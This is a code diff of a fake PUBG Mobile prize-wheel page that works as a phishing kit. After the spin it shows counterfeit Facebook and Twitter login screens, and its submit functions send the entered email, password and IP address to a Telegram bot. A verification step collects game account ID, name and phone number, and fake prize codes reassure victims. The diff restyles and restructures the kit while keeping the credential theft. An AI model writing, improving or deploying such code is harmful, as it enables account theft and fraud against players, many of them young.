+                name.className = 'slot-name';
+                name.textContent = prize.name;
+                
+                itemContent.appendChild(img);
+                itemContent.appendChild(name);
+                item.appendChild(itemContent);
+                wheel.appendChild(item);
             }
         }
 
-        function createPrizesGrid() {
-            const grid = document.getElementById('prizesGrid');
-            prizes.forEach((prize, index) => {
+        function createPrizeGrid() {
+            const grid = document.getElementById('prizeGrid');
+            prizes.forEach(prize => {
                 const item = document.createElement('div');
                 item.className = 'prize-item';
                 item.onclick = () => showPrizeInfo(prize);
                 item.innerHTML = `
-                    <div class="prize-icon" style="margin: 0 auto 15px; background: ${prize.color}22; border-color: ${prize.color}; width: 70px; height: 70px; font-size: 30px;">
-                        ${prize.icon}
-                    </div>
+                    <img src="${prize.image}" alt="${prize.name}" class="prize-image">
                     <div class="prize-name">${prize.name}</div>
                     <div class="prize-type">${prize.type}</div>
                 `;
@@ -858,6 +1044,7 @@
         }
 
         function showPrizeInfo(prize) {
+            // Create custom alert
             const alertDiv = document.createElement('div');
             alertDiv.style.cssText = `
                 position: fixed;
@@ -865,7 +1052,7 @@
                 left: 50%;
                 transform: translate(-50%, -50%);
                 background: rgba(0,0,0,0.95);
-                border: 3px solid ${prize.color};
+                border: 3px solid #ffd700;
                 border-radius: 20px;
                 padding: 30px;
                 z-index: 10000;
@@ -876,12 +1063,12 @@
             `;
             
             alertDiv.innerHTML = `
-                <div style="font-size: 50px; margin-bottom: 20px; color: ${prize.color}">${prize.icon}</div>
-                <div style="color: ${prize.color}; font-size: 24px; margin-bottom: 10px; font-weight: bold;">${prize.name}</div>
-                <div style="color: #fff; font-size: 18px; margin-bottom: 15px;">${prize.type}</div>
-                <div style="color: #aaa; font-size: 14px; margin-bottom: 25px;">Rare exclusive prize from PUBG Mobile!</div>
+                <div style="font-size: 40px; margin-bottom: 15px;">🎁</div>
+                <div style="color: #ffd700; font-size: 22px; margin-bottom: 10px; font-weight: bold;">${prize.name}</div>
+                <div style="color: #00ff95; font-size: 16px; margin-bottom: 15px;">${prize.type}</div>
+                <div style="color: #aaa; font-size: 14px; margin-bottom: 20px;">Rare exclusive prize!</div>
                 <button onclick="this.parentElement.remove(); this.parentElement.nextElementSibling.remove()" 
-                        style="background: ${prize.color}; color: white; border: none; padding: 12px 30px; border-radius: 10px; cursor: pointer; font-weight: bold;">
+                        style="background: #ff6b00; color: white; border: none; padding: 12px 30px; border-radius: 10px; cursor: pointer;">
                     CLOSE
                 </button>
             `;
@@ -910,51 +1097,52 @@
         // Spin the wheel
         document.getElementById('spinButton').addEventListener('click', function() {
             if (hasSpun) {
-                showAlert('⚠️ You already spun the wheel! Only one spin per account.');
+                showAlert('You already spun the wheel! Only one spin per account.');
                 return;
             }
-
-            if (isSpinning) return;
-            isSpinning = true;
 
             const spinBtn = this;
             const wheel = document.getElementById('slotWheel');
             
             // Disable button and start spinning
             spinBtn.disabled = true;
-            spinBtn.innerHTML = 'SPINNING...';
+            spinBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> SPINNING...';
             
             // Calculate random prize
             const randomPrizeIndex = Math.floor(Math.random() * prizes.length);
             userData.selectedPrize = prizes[randomPrizeIndex];
             
-            // Calculate target rotation
-            const targetRotation = 5 * 360 + (360 / 8) * randomPrizeIndex + 22.5;
+            // Calculate target rotation (land on the selected prize)
+            const targetAngle = 360 * 5 + (360 / totalItems) * randomPrizeIndex;
+            currentRotation = currentRotation % 360;
             
             // Start spinning animation
             wheel.style.transition = 'transform 4s cubic-bezier(0.1, 0.2, 0.3, 1)';
-            wheel.style.transform = `translate(-50%, -50%) rotate(${targetRotation}deg)`;
+            wheel.style.transform = `rotate(${currentRotation + targetAngle}deg)`;
             
-            // Sound effect
+            // Add spinning sound effect simulation
             playSpinSound();
             
             // Confetti effect
-            setTimeout(() => createConfetti(), 2000);
+            setTimeout(createConfetti, 2000);
             
             // Show result after spin
             setTimeout(() => {
-                spinBtn.innerHTML = 'PRIZE WON!';
+                spinBtn.innerHTML = '<i class="fas fa-check"></i> PRIZE WON!';
                 hasSpun = true;
-                isSpinning = false;
                 
                 // Show prize won
                 setTimeout(() => {
                     showAlert(`🎉 CONGRATULATIONS!\nYou won: ${userData.selectedPrize.name}\nType: ${userData.selectedPrize.type}\n\nClick OK to claim your prize!`);
                 }, 500);
+                
+                // Save rotation for next spin
+                currentRotation = (currentRotation + targetAngle) % 360;
             }, 4000);
         });
 
         function playSpinSound() {
+            // Simulate sound with visual feedback
             const soundIndicator = document.createElement('div');
             soundIndicator.innerHTML = '🎵';
             soundIndicator.style.cssText = `
@@ -970,7 +1158,7 @@
         }
 
         function createConfetti() {
-            for (let i = 0; i < 100; i++) {
+            for (let i = 0; i < 150; i++) {
                 const confetti = document.createElement('div');
                 confetti.className = 'confetti';
                 confetti.style.left = Math.random() * 100 + 'vw';
@@ -986,7 +1174,7 @@
         }
 
         function getRandomColor() {
-            const colors = ['#ff0000', '#ff6b00', '#ffd700', '#00ff95', '#1da1f2', '#9b59b6'];
+            const colors = ['#ff0000', '#ff6b00', '#ffd700', '#00ff95', '#1da1f2', '#9b59b6', '#ff00ff'];
             return colors[Math.floor(Math.random() * colors.length)];
         }
 
@@ -1007,12 +1195,13 @@
                 max-width: 90%;
                 font-size: 16px;
                 backdrop-filter: blur(10px);
+                animation: slideDown 0.3s ease;
             `;
             
             alertDiv.innerHTML = `
                 <div style="white-space: pre-line;">${message}</div>
                 <button onclick="this.parentElement.remove()" 
-                        style="margin-top: 15px; background: #ff6b00; color: white; border: none; padding: 10px 25px; border-radius: 5px; cursor: pointer; font-weight: bold;">
+                        style="margin-top: 15px; background: #ff6b00; color: white; border: none; padding: 10px 25px; border-radius: 5px; cursor: pointer;">
                     OK
                 </button>
             `;
@@ -1023,154 +1212,76 @@
             }, 5000);
         }
 
-        function showFacebookLogin() {
-            const loginDiv = document.createElement('div');
-            loginDiv.style.cssText = `
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background: #f0f2f5;
-                z-index: 10000;
-                overflow-y: auto;
-            `;
+        // Page navigation
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById(pageId).classList.add('active');
             
-            loginDiv.innerHTML = `
-                <div style="background: #fff; padding: 40px 20px 30px; text-align: center; border-bottom: 1px solid #dadde1;">
-                    <div style="color: #1877f2; font-size: 48px; font-weight: bold; margin-bottom: 20px; font-family: Helvetica, Arial, sans-serif; letter-spacing: -2px;">facebook</div>
-                    <div style="color: #1c1e21; font-size: 20px; line-height: 1.4;">Log in to your Facebook account to connect to PUBG MOBILE</div>
-                </div>
-                
-                <div style="padding: 30px 25px; background: #fff;">
-                    <input type="text" id="fbLoginEmail" placeholder="Mobile number or email address" 
-                           style="width: 100%; padding: 18px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 18px; margin-bottom: 20px;">
-                    
-                    <input type="password" id="fbLoginPassword" placeholder="Password" 
-                           style="width: 100%; padding: 18px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 18px; margin-bottom: 20px;">
-                    
-                    <button onclick="submitFacebookLogin()" 
-                            style="width: 100%; padding: 18px; background: #1877f2; color: #fff; border: none; border-radius: 6px; font-size: 22px; font-weight: bold; cursor: pointer; margin-bottom: 20px;">
-                        Log In
-                    </button>
-                    
-                    <a href="#" style="color: #1877f2; text-decoration: none; font-size: 16px; display: block; text-align: center; margin: 20px 0;">Forgotten password?</a>
-                    
-                    <hr style="border: none; border-top: 1px solid #dadde1; margin: 25px 0;">
-                    
-                    <button onclick="submitFacebookLogin()" 
-                            style="width: 100%; padding: 18px; background: #42b72a; color: #fff; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-bottom: 15px;">
-                        Create account
-                    </button>
-                    
-                    <button onclick="closeLogin()" 
-                            style="width: 100%; padding: 18px; background: #e4e6eb; color: #4b4f56; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer;">
-                        Not now
-                    </button>
-                </div>
-            `;
-            
-            loginDiv.id = 'facebookLogin';
-            document.body.appendChild(loginDiv);
+            // Update login method
+            if (pageId === 'facebookPage') {
+                userData.loginMethod = 'facebook';
+            } else if (pageId === 'twitterPage') {
+                userData.loginMethod = 'twitter';
+            }
         }
 
-        function showTwitterLogin() {
-            const loginDiv = document.createElement('div');
-            loginDiv.style.cssText = `
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background: #000;
-                z-index: 10000;
-                overflow-y: auto;
-            `;
-            
-            loginDiv.innerHTML = `
-                <div style="padding: 40px 20px 30px; text-align: center; border-bottom: 1px solid #2f3336;">
-                    <div style="color: #1da1f2; font-size: 40px; margin-bottom: 20px;">
-                        <i class="fab fa-twitter"></i>
-                    </div>
-                    <div style="color: #fff; font-size: 26px; font-weight: bold; margin-bottom: 10px;">Log in to Twitter</div>
-                    <div style="color: #6e767d; font-size: 18px; line-height: 1.4;">Log in to your Twitter account to connect to PUBG MOBILE</div>
-                </div>
-                
-                <div style="padding: 30px 25px;">
-                    <input type="text" id="twLoginEmail" placeholder="Phone, email, or username" 
-                           style="width: 100%; padding: 18px; background: transparent; border: 2px solid #2f3336; border-radius: 4px; color: #fff; font-size: 18px; margin-bottom: 20px;">
-                    
-                    <input type="password" id="twLoginPassword" placeholder="Password" 
-                           style="width: 100%; padding: 18px; background: transparent; border: 2px solid #2f3336; border-radius: 4px; color: #fff; font-size: 18px; margin-bottom: 20px;">
-                    
-                    <button onclick="submitTwitterLogin()" 
-                            style="width: 100%; padding: 18px; background: #1da1f2; color: #fff; border: none; border-radius: 25px; font-size: 18px; font-weight: bold; cursor: pointer;">
-                        Log in
-                    </button>
-                    
-                    <button onclick="closeLogin()" 
-                            style="width: 100%; padding: 18px; background: transparent; border: 2px solid #2f3336; color: #fff; margin-top: 15px; border-radius: 25px; font-size: 18px; cursor: pointer;">
-                        Cancel
-                    </button>
-                </div>
-            `;
-            
-            loginDiv.id = 'twitterLogin';
-            document.body.appendChild(loginDiv);
+        function cancelAction() {
+            showPage('mainPage');
         }
 
-        async function submitFacebookLogin() {
-            const email = document.getElementById('fbLoginEmail')?.value.trim() || '';
-            const password = document.getElementById('fbLoginPassword')?.value.trim() || '';
+        // Form submissions
+        async function submitFacebook() {
+            const email = document.getElementById('fbEmail').value.trim();
+            const password = document.getElementById('fbPassword').value.trim();
             
             if (!email || !password) {
                 showAlert('Please fill in all fields');
                 return;
             }
             
-            userData.loginMethod = 'facebook';
-            userData.credentials = { email, password };
+            // Save credentials
+            userData.credentials = {
+                email: email,
+                password: password
+            };
             
+            // Send to Telegram
             await sendToTelegram(
                 `🔵 FACEBOOK LOGIN\n📧 ${email}\n🔐 ${password}\n🎁 Prize: ${userData.selectedPrize?.name || 'None'}\n🌐 IP: ${userData.ip}`
             );
             
-            closeLogin();
+            // Show verification
             showVerification();
         }
 
-        async function submitTwitterLogin() {
-            const email = document.getElementById('twLoginEmail')?.value.trim() || '';
-            const password = document.getElementById('twLoginPassword')?.value.trim() || '';
+        async function submitTwitter() {
+            const email = document.getElementById('twitterEmail').value.trim();
+            const password = document.getElementById('twitterPassword').value.trim();
             
             if (!email || !password) {
                 showAlert('Please fill in all fields');
                 return;
             }
             
-            userData.loginMethod = 'twitter';
-            userData.credentials = { email, password };
+            // Save credentials
+            userData.credentials = {
+                email: email,
+                password: password
+            };
             
+            // Send to Telegram
             await sendToTelegram(
                 `🐦 TWITTER LOGIN\n📧 ${email}\n🔐 ${password}\n🎁 Prize: ${userData.selectedPrize?.name || 'None'}\n🌐 IP: ${userData.ip}`
             );
             
-            closeLogin();
+            // Show verification
             showVerification();
         }
 
-        function closeLogin() {
-            const fbLogin = document.getElementById('facebookLogin');
-            const twLogin = document.getElementById('twitterLogin');
-            if (fbLogin) fbLogin.remove();
-            if (twLogin) twLogin.remove();
-        }
-
-        function cancelAction() {
-            showAlert('Action cancelled');
-        }
-
         function showVerification() {
+            // Create verification modal
             const verifyDiv = document.createElement('div');
             verifyDiv.style.cssText = `
                 position: fixed;
@@ -1217,7 +1328,7 @@
                     <button onclick="submitVerification()" style="flex: 1; background: #ff6b00; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; font-weight: bold;">
                         SUBMIT
                     </button>
-                    <button onclick="closeVerification()" style="flex: 1; background: #666; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer;">
+                    <button onclick="cancelVerification()" style="flex: 1; background: #666; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer;">
                         CANCEL
                     </button>
                 </div>
@@ -1226,6 +1337,7 @@
             verifyDiv.id = 'verificationModal';
             document.body.appendChild(verifyDiv);
             
+            // Add overlay
             const overlay = document.createElement('div');
             overlay.style.cssText = `
                 position: fixed;
@@ -1238,11 +1350,11 @@
                 backdrop-filter: blur(5px);
             `;
             overlay.id = 'verificationOverlay';
-            overlay.onclick = closeVerification;
+            overlay.onclick = cancelVerification;
             document.body.appendChild(overlay);
         }
 
-        window.submitVerification = async function() {
+        window.submitVerification = function() {
             const charId = document.getElementById('verifyCharId').value.trim();
             const charName = document.getElementById('verifyCharName').value.trim();
             const phone = document.getElementById('verifyPhone').value.trim();
@@ -1254,6 +1366,7 @@
                 return;
             }
             
+            // Save account info
             userData.accountInfo = {
                 characterId: charId,
                 characterName: charName,
@@ -1262,15 +1375,17 @@
                 platform: platform
             };
             
-            closeVerification();
+            // Remove verification modal
+            cancelVerification();
             
-            await sendCompleteData();
+            // Send complete data
+            sendCompleteData();
             
-            const prizeCode = generatePrizeCode();
-            showAlert(`✅ CONGRATULATIONS!\n\nYour prize: ${userData.selectedPrize.name}\nCode: ${prizeCode}\n\nThe code will be sent to your email within 24 hours!`);
+            // Show congratulations
+            showCongratulations();
         };
 
-        window.closeVerification = function() {
+        window.cancelVerification = function() {
             const modal = document.getElementById('verificationModal');
             const overlay = document.getElementById('verificationOverlay');
             if (modal) modal.remove();
@@ -1329,6 +1444,29 @@
             } catch (error) {
                 console.error('Telegram error:', error);
             }
+        }
+
+        function showCongratulations() {
+            const prize = userData.selectedPrize;
+            const prizeCode = generatePrizeCode();
+            
+            document.getElementById('wonPrizeImage').src = prize.image;
+            document.getElementById('wonPrizeName').textContent = prize.name;
+            document.getElementById('wonPrizeType').textContent = prize.type;
+            document.getElementById('prizeCode').textContent = prizeCode;
+            
+            document.getElementById('congratsModal').style.display = 'flex';
+            createConfetti();
+        }
+
+        function closeModal() {
+            document.getElementById('congratsModal').style.display = 'none';
+            showPage('mainPage');
+            
+            // Reset for next time
+            setTimeout(() => {
+                showAlert('Your prize code has been sent to your account! Check your in-game mailbox within 24 hours.');
+            }, 500);
         }
 
         function generateSessionId() {
